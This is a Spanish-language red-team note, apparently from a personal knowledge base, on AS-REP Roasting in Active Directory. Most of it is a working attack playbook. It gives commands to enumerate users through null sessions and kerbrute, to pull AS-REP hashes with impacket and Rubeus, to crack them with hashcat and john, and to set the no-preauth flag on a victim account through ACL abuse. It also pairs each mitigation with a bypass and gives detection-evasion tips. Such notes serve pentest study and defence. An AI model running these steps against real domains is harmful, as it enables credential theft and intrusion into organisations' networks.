---
aliases:
  - Kerberos AS-REP Roasting
  - AS-REP Roast
  - ASREP Roasting
tags:
  - type/atomic
  - technique/credential-access
  - technique/kerberos
  - env/windows
  - asset/active-directory
  - cred/kerberos
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
tertiary categories:
  - "[[Active Directory]]"
type: Atomic
linked:
  - "[[Active Directory Exploitation]]"
  - "[[Kerberos (88) - Enumeración]]"
  - "[[Kerberoasting]]"
---
# AS-REP Roasting

***

## Cheatsheet
^asrep-roasting

| Paso | Comando | Contexto |
| --- | --- | --- |
| **Enum users sin pre-auth (unauth)** | `impacket-GetNPUsers dom.local/ -dc-ip DC -usersfile users.txt -no-pass` | Sin creds |
| **Auth enum** | `impacket-GetNPUsers dom.local/user:pass -dc-ip DC -request` | Con creds válidas |
| **Rubeus asreproast** | `Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt` | Windows on-host |
| **PowerView flag** | `Get-DomainUser -PreauthNotRequired` | Identificar cuentas vulnerables |
| **Crack** | `hashcat -m 18200 hashes.txt rockyou.txt` | etype 23 (RC4) |

***

## Concepto

Por default Kerberos requiere **pre-authentication**: el cliente envía un timestamp cifrado con su NT hash en el AS-REQ. Si `DONT_REQ_PREAUTH` está seteado en el UAC del usuario, el KDC devuelve un AS-REP conteniendo un blob cifrado con la NT hash del user.

Ese blob → crack offline → password del user.

**Diferencia con Kerberoasting**:
- Kerberoast necesita creds válidas + SPN en cuenta de user.
- AS-REP solo necesita username list; hash **del user mismo** (no de service account).

## Requisitos

- Lista de usernames del dominio.
- Conectividad al DC (puerto 88).
- Al menos un user con `DONT_REQ_PREAUTH` (flag raro pero presente en muchos dominios).

## 1. Identificar cuentas vulnerables

### Windows (PowerView)
```powershell
Get-DomainUser -PreauthNotRequired -Properties samaccountname,useraccountcontrol
```

### LDAP query raw
```
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
```

### BloodHound
Query: `Find AS-REP Roastable Users (DontRequirePreAuth)`.

## 2. Enum sin creds (spray approach)

Con solo lista de usernames — no requiere password válido.

```bash
# Usernames genéricos + custom
impacket-GetNPUsers dom.local/ -dc-ip 10.10.10.10 -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass
```

Si el user no tiene `DONT_REQ_PREAUTH` → error "User X doesn't have UF_DONT_REQUIRE_PREAUTH set" (silencioso, útil para enum paralela).

Si lo tiene → hash al output.

### Generar user list
```bash
# Del DC via kerbrute (brute enum)
kerbrute userenum -d dom.local --dc 10.10.10.10 /usr/share/wordlists/jsmith.txt

# Via SMB null session
nxc smb DC -u '' -p '' --users

# Via RPC
rpcclient -U "" -N DC -c "enumdomusers"
```

## 3. Enum con creds (masivo)

```bash
impacket-GetNPUsers dom.local/user:pass -dc-ip 10.10.10.10 -request -format hashcat -outputfile hashes.txt
```

Devuelve todos los hashes de users con flag seteado en el dominio.

## 4. Rubeus (on-host)

```powershell
# Todos
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

# Target
.\Rubeus.exe asreproast /user:svcaccount /format:hashcat

# NoPreauth check + output
.\Rubeus.exe asreproast /nowrap /format:hashcat

# Cross-domain
.\Rubeus.exe asreproast /domain:other.dom.local /dc:OTHER-DC
```

## 5. Crack offline

```bash
# etype 23 (RC4-HMAC-MD5)
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt -O

# Con rules
hashcat -m 18200 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John
john --format=krb5asrep --wordlist=rockyou.txt hashes.txt
```

Formato hash esperado:
```
$krb5asrep$23$user@DOM.LOCAL:abc123...
```

## 6. Targeted AS-REP Roasting (abuso de ACL)

Con `WriteProperty` sobre UAC del user → setear `DONT_REQ_PREAUTH` → roast:

```powershell
# Setear flag
Set-DomainObject -Identity victim_user -XOR @{useraccountcontrol=4194304}

# Roast
Rubeus.exe asreproast /user:victim_user /format:hashcat

# Quitar flag (opsec)
Set-DomainObject -Identity victim_user -XOR @{useraccountcontrol=4194304}
```

## 7. Mitigaciones (y bypass)

| Control | Bypass |
| --- | --- |
| `DONT_REQ_PREAUTH` desactivado en todos | Targeted via ACL write |
| Password fuerte | Solo funciona si es débil/predecible |
| AES-only | Hashcat `-m 18200` soporta, más lento |
| Monitoring event 4768 con pre-auth = 0 | Baja frecuencia + targeted |

***

## OpSec

- Sin pre-auth el request es **unauth** → no aparece en logs de autenticación del user.
- Evento 4768 registra AS-REQ pero con "Pre-Authentication Type: 0" — señal detectable.
- No tocar flag UAC de users random — sospechoso.

## Recursos

- [HackTricks - AS-REP Roasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)
- [HarmJ0y - Roasting AS-REPs](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)

***
